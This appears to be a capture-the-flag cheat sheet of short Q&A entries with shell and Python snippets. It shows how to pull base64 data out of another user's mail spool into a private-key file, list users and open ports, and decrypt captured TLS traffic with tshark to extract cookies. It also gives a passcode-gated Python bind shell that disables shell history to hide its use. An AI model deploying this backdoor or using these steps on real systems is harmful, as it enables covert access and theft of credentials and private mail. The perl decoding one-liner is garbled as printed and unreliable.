# Investigate Deaths

### What is a handy bash script to decode mail attachments?
```
cat /var/spool/mail/arthur | egrep "^(\w|\+|=|/)+$" | base64 -d > /tmp/arthur.priv
```

### How do you find a user's ID?
```
id -u brett
```

### What command shows which user is opening ports?
```
netstat -palute
```

### What's a handy python script for a shell via telnet?
```
import os
import pty
import socket as sc

def mn():
    s = sc.socket()
    s.bind(('',0)) #random port from 1024-65535
    s.listen(1)
    (rem, addr) = s.accept()
    if "passcode" in rem.recv(1024).strip().decode("utf-8"):
        os.dup2(rem.fileno(),0)
        os.dup2(rem.fileno(),1)
        os.dup2(rem.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    mn()
```

### How do you decode binary inline on the terminal?
```
cat <file> | perl -lpe '$=pack"B*",$'
```

### How do you view SSL-encrypted traffic in Wireshark if you have the keyfile?
`Edit>Preferences>Protocols>SSL` 

### How do you view SSL-encrypted traffic in tshark if you have the keyfile?
```
tshark -nr kanes.body -o ssl.keylog_file:./client_random.keylog -T fields -e http2.headers.cookie
```
